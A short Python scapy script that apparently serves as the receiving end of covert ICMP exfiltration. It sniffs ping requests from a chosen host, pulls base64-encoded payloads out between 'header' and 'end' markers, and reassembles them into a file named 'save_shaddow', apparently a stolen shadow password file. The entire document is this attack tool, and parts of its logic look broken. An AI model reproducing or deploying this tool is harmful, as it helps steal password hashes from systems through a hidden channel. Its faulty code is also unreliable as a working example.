from scapy import all as scapy
import base64

def sniffing():
    print("Enter IP Host:")
    ip_host = input()
    print("Écoute en cours ...")
    capture = scapy.sniff(filter="icmp and icmp[0]=8 and host " + ip_host, prn=lambda x: x.show())
    a = 0
    b = False
    while capture[a]:
        paquet = capture[a]
        raw = str(paquet.lastlayer())
        if raw == "header":
            b = True
        if raw == "end":
            exit()
        if b:
            if raw == "header":
                a += 1
            else:
                a += 1
                fichier_shaddow = open("save_shaddow", "a")
                sans_hash = raw.replace("hash", "")
                decode = base64.b64decode(sans_hash)
                fichier_shaddow.write(decode)
                fichier_shaddow.close()
        else:
            a += 1


sniffing()
